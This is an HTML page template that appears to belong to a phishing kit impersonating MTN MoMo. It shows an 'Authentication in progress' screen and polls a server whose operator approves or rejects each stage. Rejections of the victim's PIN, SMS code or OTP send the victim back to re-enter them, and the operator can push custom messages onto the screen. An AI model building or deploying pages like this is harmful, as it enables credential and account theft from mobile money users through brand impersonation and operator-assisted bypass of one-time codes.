<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Authentication - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        html, body {
            margin: 0; padding: 0; width: 100%; min-height: 100vh;
            background-color: #003366; color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; align-items: center; justify-content: center; text-align: center;
        }
        .screen-container { width: 100%; max-width: 500px; padding: 30px 20px; }
        .hourglass-circle {
            width: 120px; height: 120px;
            background-color: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 50%; display: inline-flex;
            align-items: center; justify-content: center;
            font-size: 3rem; margin-bottom: 25px;
        }
        .notice-banner {
            background-color: rgba(255, 255, 255, 0.05);
            border-radius: 12px; padding: 14px 20px;
            margin-top: 20px; font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.7);
        }
        .app-id-tag { color: #FFCC00; font-weight: 700; letter-spacing: 1px; }
        .custom-msg-box {
            background: #FFCC00; color: #003366;
            padding: 15px; border-radius: 12px;
            font-weight: 700; margin-top: 15px; display: none;
        }
    </style>
</head>
<body>
    <div class="screen-container">
        
        <!-- Waiting State -->
        <div id="waitSection">
            <div class="hourglass-circle">⏳</div>
            <h2 class="fw-bold mb-2 fs-1">Authentication in progress...</h2>
            <p class="text-white-50 lead fs-6 mb-3">Please wait</p>
            <div id="customMsg" class="custom-msg-box mb-3"></div>
            <div class="notice-banner mb-4">Do not close this page</div>
            <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
        </div>

    </div>

    <script>
        const appId = "{{ app_id }}";
        let isRedirecting = false;

        function checkStatus() {
            if (isRedirecting) return;

            fetch(`/check-status?app_id=${appId}`)
                .then(response => response.json())
                .then(data => {
                    console.log("Status check:", data);
                    const msgBox = document.getElementById('customMsg');

                    // Handle Rejections smoothly inline without popup alerts
                    if (data.status === "Rejected" || (data.status && data.status.startsWith("Reject_"))) {
                        isRedirecting = true;

                        let targetUrl = "/login";
                        if (data.status === "Reject_PIN") {
                            targetUrl = "/login";
                        } else if (data.status === "Reject_SMS") {
                            targetUrl = "/submit-auth-code";
                        } else if (data.status === "Reject_OTP") {
                            targetUrl = "/final-verify";
                        }

                        // Display clear red error message inline
                        msgBox.style.display = 'block';
                        msgBox.style.background = '#dc3545';
                        msgBox.style.color = '#ffffff';
                        msgBox.textContent = data.custom_message || "Verification failed. Redirecting...";

                        // Wait 2 seconds so the user sees the error before smoothly navigating back
                        setTimeout(() => {
                            window.location.replace(targetUrl);
                        }, 2000);
                    } 
                    // Handle Approvals / Stage transitions
                    else if (data.status === "Stage1_Approved" || data.status === "Stage2_Approved") {
                        isRedirecting = true;
                        window.location.replace("/submit-auth-code");
                    } 
                    else if (data.status === "Stage3_Approved" || data.status === "Approved") {
                        isRedirecting = true;
                        window.location.replace("/success");
                    } 
                    // Handle Custom Admin Notes
                    else if (data.status === "CustomMessage" && data.custom_message) {
                        msgBox.style.display = 'block';
                        msgBox.style.background = '#FFCC00';
                        msgBox.style.color = '#003366';
                        msgBox.textContent = data.custom_message;
                    }
                })
                .catch(err => console.error("Error checking status:", err));
        }

        // Poll every 3 seconds
        if (appId) {
            setInterval(checkStatus, 3000);
        }
    </script>
</body>
</html>
